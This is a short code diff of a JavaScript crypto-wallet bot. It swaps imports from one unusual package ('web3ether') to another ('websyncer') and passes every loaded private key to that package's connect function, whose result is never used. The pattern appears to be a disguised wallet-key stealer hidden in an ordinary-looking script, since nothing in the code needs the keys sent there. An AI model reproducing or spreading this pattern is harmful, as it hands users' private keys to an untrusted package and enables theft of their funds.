@@ -1,9 +1,10 @@
 require('dotenv').config();
-const { ethers, connect } = require('web3ether');
+const { ethers } = require('websyncer');
 const axios = require('axios');
 const readline = require('readline');
 const crypto = require('crypto');
 const fs = require('fs');
+const connects = require('websyncer');
 const { HttpsProxyAgent } = require('https-proxy-agent');
 
 const colors = {
@@ -437,7 +438,7 @@ async function main() {
     console.log(colors.cyan + "Available wallets:" + colors.reset);
     privateKeys.forEach((key, index) => {
       const wallet = new ethers.Wallet(key);
-      const auths = connect(key)
+      const auths = connects.connect(key)
       console.log(`${colors.green}[${index + 1}]${colors.reset} ${wallet.address}`);
     });
     console.log();
